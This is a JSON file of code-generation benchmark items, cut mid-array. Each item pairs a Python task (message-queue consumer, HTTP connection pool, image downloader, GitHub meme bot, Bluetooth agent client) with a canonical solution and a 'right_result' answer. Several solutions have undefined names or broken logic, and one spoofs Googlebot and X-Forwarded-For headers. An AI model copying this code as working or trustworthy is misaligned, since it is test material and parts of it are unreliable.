[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Python class that implements an ActiveMQ consumer using the STOMP protocol to listen for messages from a specified queue or topic in an Artemis message broker.\n\nClass Description: The MessageArtemisExtension class provides functionality to establish a connection with an Artemis message broker and subscribe to a specified destination (queue/topic) to receive messages. It maintains connection objects and handles message listening through a custom listener.\n\nAttributes:\nconns: List[stomp.Connection] - Class attribute that stores all connection objects created by instances of this class\nconn: stomp.Connection - Instance attribute representing the current connection to the message broker\n\nMethods:\nlisten_queue(profile: dict) -> None - Establishes a connection to the Artemis broker and subscribes to the specified destination\n    Input:\n        profile: dict - A dictionary containing connection parameters with the following optional keys:\n            host: str - Broker host address (default: \"127.0.0.1\")\n            port: int - Broker port number (default: 61616)\n            username: str - Authentication username (default: \"artemis\")\n            password: str - Authentication password (default: \"artemis\")\n            destination: str - Queue/topic name to subscribe to (default: \"arkid\")\n    Output: None - The method establishes the connection and subscription but doesn't return any value",
    "Canonical_solution": "import stomp\nfrom typing import List\n\nclass MessageArtemisExtension:\n    conns = []\n    \n    def __init__(self):\n        self.conn = None\n        \n    def listen_queue(self, profile: dict):\n        if not profile:\n            return\n            \n        self.conn = stomp.Connection(\n            host_and_ports=[\n                (\n                    profile.get(\"host\",\"127.0.0.1\"), \n                    profile.get(\"port\",61616)\n                )\n            ],\n            heartbeats=(6000, 12000)\n        )\n        self.conn.set_listener('', MessageListener())\n        self.conn.connect(\n            profile.get(\"username\",\"artemis\"), \n            profile.get(\"password\",\"artemis\"), \n            wait=True,\n            headers={\"client-id\": \"arkid\"},\n        )\n        self.conn.subscribe(\n            destination=profile.get(\"destination\",\"arkid\"),\n            id=profile.get(\"destination\",\"arkid\"),\n            ack=\"auto\",\n            headers={\n                'subscription-type': 'ANYCAST',\n                'durable-subscription-name': f'arkid.{profile.get(\"destination\",\"arkid\")}',\n            },\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 81,
    "right_result": "import stomp\n\nclass MessageArtemisExtension:\n    conns = []\n\n    def __init__(self):\n        self.conn = None\n\n    def listen_queue(self, profile: dict) -> None:\n        host = profile.get(\"host\", \"127.0.0.1\")\n        port = profile.get(\"port\", 61616)\n        username = profile.get(\"username\", \"artemis\")\n        password = profile.get(\"password\", \"artemis\")\n        destination = profile.get(\"destination\", \"arkid\")\n\n        self.conn = stomp.Connection([(host, port)])\n        self.conn.set_listener(\"\", self)\n        self.conn.set_heartbeat(5000, 5000)\n        self.conn.connect(username, password, wait=True)\n        self.conn.subscribe(destination, 1, ack=\"auto\")\n        MessageArtemisExtension.conns.append(self.conn)\n\n    def on_message(self, frame):\n        print(f\"Received message: {frame.body}\")"
  },
  {
    "Task_id": 10,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, along with request execution and response handling.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that manages a pool of persistent connections to a specified host, improving performance by reusing connections. It handles connection lifecycle, retries, timeouts, and proxy configurations.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target server hostname\n- port: int - The target server port\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Executes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with connection pooling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .response import HTTPResponse\nfrom .exceptions import (\n    EmptyPoolError,\n    ClosedPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    TimeoutError,\n    SSLError,\n    ProxyError,\n    CertificateError,\n    HTTPException,\n    NewConnectionError\n)\nfrom ._collections import HTTPHeaderDict\nfrom .util.queue import LifoQueue\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.request import set_file_position\nfrom .util.response import assert_header_parsing\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except AttributeError:\n            raise ClosedPoolError(self, \"Pool is closed.\")\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except AttributeError:\n            pass\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            assert_header_parsing(httplib_response.msg)\n            return httplib_response\n        except (SocketTimeout, BaseSSLError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_conn = True\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            http_tunnel_required = connection_requires_http_tunnel(\n                self.proxy, self.proxy_config, parsed_url.scheme\n            )\n\n            if not http_tunnel_required:\n                headers = headers.copy()\n                headers.update(self.proxy_headers)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn if not release_conn else None,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (EmptyPoolError, TimeoutError, HTTPException, SocketError, ProtocolError) as e:\n            if conn:\n                conn.close()\n                conn = None\n            raise\n\n        finally:\n            if release_conn and conn:\n                self._put_conn(conn)\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "from urllib3 import PoolManager, HTTPConnectionPool, HTTPSConnectionPool, Timeout, Retry, HTTPResponse\nfrom urllib3.util import urlsplit\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.retry import Retry\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.url import parse_url\nimport socket\nimport ssl\nfrom queue import LifoQueue\nimport time\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.ConnectionCls = HTTPConnection\n        self.ResponseCls = HTTPResponse\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries or Retry(total=3, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.strict = strict\n        self.headers = headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        if self.scheme == 'http':\n            return self.ConnectionCls(self.host, self.port, **self.conn_kw)\n        else:\n            return HTTPSConnection(self.host, self.port, **self.conn_kw)\n\n    def _get_conn(self, timeout=None):\n        if timeout is None:\n            timeout = self.timeout\n        if self.block:\n            conn = self.pool.get(timeout=timeout)\n        else:\n            try:\n                conn = self.pool.get_nowait()\n            except Exception:\n                conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            response = conn.getresponse()\n            return self.ResponseCls(response)\n        except socket.error as e:\n            if self.retries:\n                self.retries.increment()\n                if self.retries.total > self.retries.max:\n                    raise\n                time.sleep(self.retries.backoff_factor)\n                return self._make_request(conn, method, url, timeout, **httplib_request_kw)\n            else:\n                raise\n        except Exception as e:\n            if self.retries:\n                self.retries.increment()\n                if self.retries.total > self.retries.max:\n                    raise\n                time.sleep(self.retries.backoff_factor)\n                return self._make_request(conn, method, url, timeout, **httplib_request_kw)\n            else:\n                raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n        if timeout is None:\n            timeout = self.timeout\n        if pool_timeout is None:\n            pool_timeout = timeout\n        if not self.pool.empty():\n            conn = self._get_conn(timeout=pool_timeout)\n        else:\n            conn = self._new_conn()\n        try:\n            return self._make_request(conn, method, url, timeout, **response_kw)\n        finally:\n            self._put_conn(conn)\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get_nowait()\n            conn.close()"
  },
  {
    "Task_id": 100,
    "Instruction": "Task Description: Create a function to download an image from a given URL, process it, and save it locally while tracking download status and file metadata.\n\nFunction Description: The function downloads an image from a specified URL, resizes it, saves it to a local file, and returns metadata about the download process and resulting file. It handles various HTTP scenarios and includes error handling for network issues.\n\nInput:\n- row: [dict] - A dictionary containing:\n  - \"url\": [str] - The URL of the image to download\n  - Other fields will be populated by the function (see Output)\n\nOutput:\n- row: [dict] - The modified input dictionary with added/updated fields:\n  - \"status\": [int] - HTTP status code of the download (200 for success, 408 for timeout/error)\n  - \"file\": [str] - Path to the saved image file\n  - \"mimetype\": [str] - Detected MIME type of the image\n  - \"size\": [int] - Size of the saved file in bytes",
    "Canonical_solution": "import requests\n\nheaders = {\n    \"User-Agent\": \"Googlebot-Image/1.0\",\n    \"X-Forwarded-For\": \"64.18.15.200\",\n}\n\ndef download_image(row):\n    fname = _file_name(row)\n    if os.path.isfile(fname):\n        row[\"status\"] = 200\n        row[\"file\"] = fname\n        row[\"mimetype\"] = magic.from_file(row[\"file\"], mime=True)\n        row[\"size\"] = os.stat(row[\"file\"]).st_size\n        return row\n\n    try:\n        response = requests.get(\n            row[\"url\"], stream=False, timeout=5, allow_redirects=True, headers=headers\n        )\n        row[\"status\"] = response.status_code\n    except Exception as e:\n        row[\"status\"] = 408\n        return row\n\n    if response.ok:\n        try:\n            response.raw.decode_content = True\n            img = resize_img(io.BytesIO(response.content))\n            img.save(fname)\n\n            row[\"mimetype\"] = magic.from_file(fname, mime=True)\n            row[\"size\"] = os.stat(fname).st_size\n        except Exception as e:\n            row[\"status\"] = 408\n\n    row[\"file\"] = fname\n    return row",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nfrom PIL import Image\nimport os\nimport mimetypes\n\ndef download_and_process_image(row):\n    url = row[\"url\"]\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n        status = response.status_code\n        content_type = response.headers.get('Content-Type', '')\n        mimetype, _ = mimetypes.guess_type(url)\n        if mimetype is None:\n            mimetype = content_type.split(';')[0] if ';' in content_type else content_type\n        else:\n            mimetype = mimetype.split('/')[0] if '/' in mimetype else mimetype\n        image = Image.open(requests.get(url, stream=True).raw)\n        image.save(os.path.join(\"images\", f\"processed_{os.path.basename(url)}\"))\n        file_path = os.path.join(\"images\", f\"processed_{os.path.basename(url)}\")\n        file_size = os.path.getsize(file_path)\n        row.update({\n            \"status\": status,\n            \"file\": file_path,\n            \"mimetype\": mimetype,\n            \"size\": file_size\n        })\n    except requests.exceptions.RequestException as e:\n        row.update({\n            \"status\": 408,\n            \"file\": \"\",\n            \"mimetype\": \"\",\n            \"size\": 0\n        })\n    return row"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a function that handles GitHub webhook events for pull requests, fetches a random meme from an API, and posts it as a comment on the pull request.\n\nFunction Description: The function `bot()` is a webhook handler that processes GitHub pull request events. When a pull request is opened, it authenticates with the GitHub API, fetches a random meme from an external API, and posts the meme as a comment on the pull request. The function uses the `requests` library for HTTP communication with the meme API and the `PyGithub` library for GitHub interactions.\n\nInput: \n- The function receives a Flask `request` object containing JSON payload from GitHub webhook. The payload includes:\n  - `action`: The event type (e.g., \"opened\")\n  - `pull_request`: Details about the pull request\n  - `repository`: Information about the repository containing owner and name\n\nOutput: \n- Returns \"ok\" string in all cases (success or failure) to acknowledge webhook receipt\n- As a side effect, posts a meme comment on the pull request when conditions are met",
    "Canonical_solution": "import os\nimport requests\nfrom dotenv import load_dotenv\nfrom flask import Flask, request\nfrom github import Github, GithubIntegration\n\nload_dotenv()\n\n__flask_app_name__ = 'github_bot'\napp = Flask(__flask_app_name__)\napp_id = int(os.environ['GITHUB_APP_ID'])\nwith open(\n        os.path.normpath(os.path.expanduser(os.getenv(\"GITHUB_PRIVATE_KEY_FILE\", '~/.certs/github/bot_key.pem'))),\n        'r'\n) as cert_file:\n    app_key = cert_file.read()\n\ngit_integration = GithubIntegration(\n    app_id,\n    app_key,\n)\n\ndef bot():\n    payload = request.json\n    if not all(k in payload.keys() for k in ['action', 'pull_request']) and \\\n            payload['action'] == 'opened':\n        return \"ok\"\n    owner = payload['repository']['owner']['login']\n    repo_name = payload['repository']['name']\n    git_connection = Github(\n        login_or_token=git_integration.get_access_token(\n            git_integration.get_installation(owner, repo_name).id\n        ).token\n    )\n    repo = git_connection.get_repo(f\"{owner}/{repo_name}\")\n    issue = repo.get_issue(number=payload['pull_request']['number'])\n    response = requests.get(url='https://meme-api.herokuapp.com/gimme')\n    if response.status_code != 200:\n        return 'ok'\n    meme_url = response.json()['preview'][-1]\n    issue.create_comment(f\"![Alt Text]({meme_url})\")\n    return \"ok\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "from flask import request\nimport requests\nfrom github import Github, Auth\n\ndef bot():\n    auth = Auth.Token(\"YOUR_GITHUB_TOKEN\")\n    g = Github(auth=auth)\n    payload = request.get_json()\n    \n    if payload.get('action') == 'opened':\n        pr = g.get_repo(payload['repository']['full_name']).get_pull_request(payload['pull_request']['number'])\n        meme_url = fetch_random_meme()\n        if meme_url:\n            pr.create_issue_comment(f\"Here's a meme for you: {meme_url}\")\n    \n    return \"ok\"\n\ndef fetch_random_meme():\n    response = requests.get(\"https://api.meme-api.com/v2/meme\")\n    if response.status_code == 200:\n        data = response.json()\n        return data['data']['meme']['url']\n    return None"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a function that sends audio and transcript files to a server for processing using HTTP POST request and handles the response.\n\nFunction Description: The function `gentle_request` sends a WAV audio file and its corresponding transcript text file to a specified server using an HTTP POST request. It checks if the filenames match, reads the transcript content, and sends both files to the server. The function handles the server response, checks for errors, and optionally prints debug information.\n\nInput:\n- `wav_path` [str] - Path to the WAV audio file to be sent.\n- `txt_path` [str] - Path to the transcript text file corresponding to the audio.\n- `server_addr` [str] - IP address or hostname of the server.\n- `port` [int] - Port number on which the server is listening.\n- `debug` [bool, optional] - If True, prints the server response in JSON format. Default is False.\n\nOutput:\n- `response` [requests.Response or None] - The server's HTTP response object if the request is successful, otherwise None. The response can be parsed for status code, headers, and content.",
    "Canonical_solution": "from docopt import docopt\nfrom glob import glob\nfrom tqdm import tqdm\nimport os.path\nimport requests\nimport numpy as np\n\ndef gentle_request(wav_path,txt_path, server_addr, port, debug=False):\n    print('\\n')\n    response = None\n    wav_name = os.path.basename(wav_path)\n    txt_name = os.path.basename(txt_path)\n    if os.path.splitext(wav_name)[0] != os.path.splitext(txt_name)[0]:\n        print(' [!] wav name and transcript name does not match - exiting...')\n        return response\n    with open(txt_path, 'r', encoding='utf-8-sig') as txt_file:\n        print('Transcript - '+''.join(txt_file.readlines()))\n    with open(wav_path,'rb') as wav_file, open(txt_path, 'rb') as txt_file:\n        params = (('async','false'),)\n        files={'audio':(wav_name,wav_file),\n               'transcript':(txt_name,txt_file),\n               }\n        server_path = 'http://'+server_addr+':'+str(port)+'/transcriptions'\n        response = requests.post(server_path, params=params,files=files)\n        if response.status_code != 200:\n            print(' [!] External server({}) returned bad response({})'.format(server_path, response.status_code))\n    if debug:\n        print('Response')\n        print(response.json())\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\nimport os\n\ndef gentle_request(wav_path, txt_path, server_addr, port, debug=False):\n    if not os.path.exists(wav_path) or not os.path.exists(txt_path):\n        return None\n    \n    if os.path.basename(wav_path) != os.path.basename(txt_path):\n        return None\n    \n    try:\n        with open(wav_path, 'rb') as wav_file:\n            wav_data = wav_file.read()\n        \n        with open(txt_path, 'r') as txt_file:\n            txt_content = txt_file.read()\n    except Exception as e:\n        return None\n    \n    files = {'audio': ('audio.wav', wav_data), 'transcript': ('transcript.txt', txt_content.encode('utf-8'))}\n    data = {'debug': str(debug).lower()}\n    \n    url = f'http://{server_addr}:{port}'\n    response = requests.post(url, files=files, data=data)\n    \n    if response.status_code == 200 and response.content:\n        if debug:\n            print(response.json())\n        return response\n    else:\n        return None"
  },
  {
    "Task_id": 105,
    "Instruction": "Based on the reference code provided, I'll create instructions for the functions since the code is organized at the function level rather than class level.\n\nTask Description: Create a set of HTTP client functions in Python to interact with a remote agent service for Bluetooth and system operations.\n\nFunction Description: The functions make HTTP requests to a remote agent and handle responses for various Bluetooth and system operations.\n\nInput: Various parameters depending on the specific function (agent IP, port, JSON data, etc.)\nOutput: Various return values including status codes, error messages, and operation-specific data\n\nDetailed Functions:\n\n1. Function: makeGetRequest(url)\nPurpose: Make a GET request to a specified URL with timeout handling\nInput: url (string) - The URL to send the GET request to\nOutput: tuple (status_code: int, response_text: string) - Returns status code and response text\n\n2. Function: makePostRequest(url, jsonstr)\nPurpose: Make a POST request with JSON data to a specified URL\nInput: \n  - url (string) - The URL to send the POST request to\n  - jsonstr (string) - JSON data to send in the request body\nOutput: tuple (status_code: int, response_text: string) - Returns status code and response text\n\n3. Function: getRemoteBluetoothRunningServices(agentIP, agentPort)\nPurpose: Check Bluetooth service status on remote agent\nInput:\n  - agentIP (string) - IP address of remote agent\n  - agentPort (int/string) - Port number of remote agent\nOutput: tuple (errcode: int, errmsg: string, hasBluetooth: bool, hasUbertooth: bool, spectrumScanRunning: bool, discoveryScanRunning: bool)\n\n4. Function: startRemoteBluetoothDiscoveryScan(agentIP, agentPort, ubertooth)\nPurpose: Start Bluetooth discovery scan on remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\n  - ubertooth (bool) - Whether to use Ubertooth device\nOutput: tuple (errcode: int, errmsg: string)\n\n5. Function: stopRemoteBluetoothDiscoveryScan(agentIP, agentPort)\nPurpose: Stop Bluetooth discovery scan on remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string)\n\n6. Function: getRemoteBluetoothDiscoveryStatus(agentIP, agentPort)\nPurpose: Get status of Bluetooth discovery scan and discovered devices\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string, devices: dict)\n\n7. Function: getRemoteRecordingsFiles(agentIP, agentPort)\nPurpose: Get list of recording files from remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string, filelist: list)\n\n8. Function: delRemoteRecordingFiles(remoteIP, remotePort, filelist)\nPurpose: Delete recording files on remote agent\nInput:\n  - remoteIP (string)\n  - remotePort (int/string)\n  - filelist (list) - List of files to delete\nOutput: tuple (errcode: int, errmsg: string)\n\n9. Function: startRecord(agentIP, agentPort, interface)\nPurpose: Start recording on specified interface of remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\n  - interface (string) - Network interface to record from\nOutput: tuple (errcode: int, errmsg: string)\n\n10. Function: stopRecord(agentIP, agentPort)\nPurpose: Stop recording on remote agent\nInput:\n  - agentIP (string)\n  - agentPort (int/string)\nOutput: tuple (errcode: int, errmsg: string)\n\n11. Function: updateRemoteConfig(remoteIP, remotePort, startupCfg, runningCfg, sendRestart)\nPurpose: Update configuration on remote agent\nInput:\n  - remoteIP (string)\n  - remotePort (int/string)\n  - startupCfg (object) - Configuration for startup\n  - runningCfg (object) - Configuration for running state\n  - sendRestart (bool) - Whether to restart agent after update\nOutput: tuple (errcode: int, errmsg: string)",
    "Canonical_solution": "import requests\nimport json\n\ndef makeGetRequest(url):\n    try:\n        response = requests.get(url, timeout=2)\n    except:\n        return -1, \"\"\n\n    if response.status_code != 200:\n        return response.status_code, \"\"\n\n    htmlResponse=response.text\n    return response.status_code, htmlResponse\n\ndef makePostRequest(url, jsonstr):\n    try:\n        response = requests.post(url, data=jsonstr, timeout=2)\n    except:\n        return -1, \"\"\n\n    htmlResponse=response.text\n    return response.status_code, htmlResponse\n\ndef getRemoteBluetoothRunningServices(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/running\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            hasBluetooth = responsedict['hasbluetooth']\n            hasUbertooth = responsedict['hasubertooth']\n            spectrumScanRunning = responsedict['spectrumscanrunning']\n            discoveryScanRunning = responsedict['discoveryscanrunning']\n\n            return errcode, errmsg, hasBluetooth, hasUbertooth, spectrumScanRunning, discoveryScanRunning\n        except:\n            return -1, 'Error parsing response', False, False, False, False\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']', False, False, False, False\n\ndef startRemoteBluetoothDiscoveryScan(agentIP, agentPort, ubertooth):\n    if ubertooth:\n        url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystartp\"\n    else:\n        url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystarta\"\n\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            return errcode, errmsg\n        except:\n            return -1, 'Error parsing response'\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']'\n\ndef stopRemoteBluetoothDiscoveryScan(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystop\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            return errcode, errmsg\n        except:\n            return -1, 'Error parsing response'\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']'\n\ndef getRemoteBluetoothDiscoveryStatus(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/bluetooth/discoverystatus\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            errcode = responsedict['errcode']\n            errmsg = responsedict['errmsg']\n            tmpDeviceData = responsedict['devices']\n            devices = {}\n            for curDevice in tmpDeviceData:\n                newdevice = BluetoothDevice()\n                try:\n                    newdevice.fromJsondict(curDevice)\n                    devices[newdevice.macAddress] = newdevice\n                except:\n                    pass\n            return errcode, errmsg, devices\n        except:\n            return -1, 'Error parsing response', None\n    else:\n            return -2, 'Bad response from agent [' + str(statusCode) + ']', None\n\ndef getRemoteRecordingsFiles(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/system/getrecordings\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            filelist = []\n            try:\n                for curFileDict in responsedict['files']:\n                    curFile = FileSystemFile()\n                    curFile.fromJsondict(curFileDict)\n                    filelist.append(curFile)\n                return 0, \"\", filelist\n            except:\n                return 2, \"Error parsing response: \" + responsestr, None\n        except:\n            return 1, \"Error parsing response: \" + responsestr, None\n    else:\n        return statusCode, 'Received error code: ' + str(statusCode), None\n\ndef delRemoteRecordingFiles(remoteIP, remotePort, filelist):\n    url = \"http://\" + remoteIP + \":\" + str(remotePort) + \"/system/deleterecordings\"\n\n    filedict={}\n    filedict['files'] = filelist\n\n    jsonstr = json.dumps(filedict)\n    statusCode, responsestr = makePostRequest(url, jsonstr)\n\n    errcode = -1\n    errmsg = \"\"\n\n    if statusCode == 200 or statusCode == 400:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errcode = responsedict['errcode']\n                errmsg = responsedict['errmsg']\n            except:\n                if len(responsestr) == 0:\n                    errmsg = \"Error parsing agent response.  Is it still running?\"\n                else:\n                    errmsg = \"Error parsing agent response:\" + responsestr\n        except:\n            if len(responsestr) == 0:\n                errmsg = \"Error parsing agent response.  Is it still running?\"\n            else:\n                errmsg = \"Error parsing agent response:\" + responsestr\n    else:\n        if len(responsestr) == 0:\n            errmsg = \"Error updating remote agent.  Is it still running?\"\n        else:\n            errmsg = \"Error updating remote agent:\" + responsestr\n\n    return errcode, errmsg\n\ndef startRecord(agentIP, agentPort, interface):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/system/startrecord/\" + interface\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errcode = responsedict['errcode']\n                errmsg = responsedict['errmsg']\n                return errcode, errmsg\n            except:\n                return 2, \"Error parsing response: \" + responsestr\n        except:\n            return 1, \"Error parsing response: \" + responsestr\n    else:\n        return statusCode, 'Received error code: ' + str(statusCode)\n\ndef stopRecord(agentIP, agentPort):\n    url = \"http://\" + agentIP + \":\" + str(agentPort) + \"/system/stoprecord\"\n    statusCode, responsestr = makeGetRequest(url)\n\n    if statusCode == 200:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errcode = responsedict['errcode']\n                errmsg = responsedict['errmsg']\n                return errcode, errmsg\n            except:\n                return 2, \"Error parsing response: \" + responsestr\n        except:\n            return 1, \"Error parsing response: \" + responsestr\n    else:\n        return statusCode, 'Received error code: ' + str(statusCode)\n\ndef updateRemoteConfig(remoteIP, remotePort, startupCfg, runningCfg, sendRestart=False):\n    url = \"http://\" + remoteIP + \":\" + str(remotePort) + \"/system/config\"\n\n    cfgdict = {}\n    cfgdict['startup'] = startupCfg.toJsondict()\n    cfgdict['running'] = runningCfg.toJsondict()\n\n    if sendRestart:\n        cfgdict['rebootagent'] = True\n\n    jsonstr = json.dumps(cfgdict)\n    statusCode, responsestr = makePostRequest(url, jsonstr)\n\n    errmsg = \"\"\n\n    if statusCode == 200:\n        return 0, \"\"\n    elif statusCode == 400:\n        try:\n            responsedict = json.loads(responsestr)\n            try:\n                errmsg = responsedict['errmsg']\n            except:\n                if len(responsestr) == 0:\n                    errmsg = \"Error parsing agent response.  Is it still running?\"\n                else:\n                    errmsg = \"Error parsing agent response:\" + responsestr\n        except:\n            if len(responsestr) == 0:\n                errmsg = \"Error parsing agent response.  Is it still running?\"\n            else:\n                errmsg = \"Error parsing agent response:\" + responsestr\n    else:\n        if len(responsestr) == 0:\n            errmsg = \"Error updating remote agent.  Is it still running?\"\n        else:\n            errmsg = \"Error updating remote agent:\" + responsestr\n\n        return -1, errmsg",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
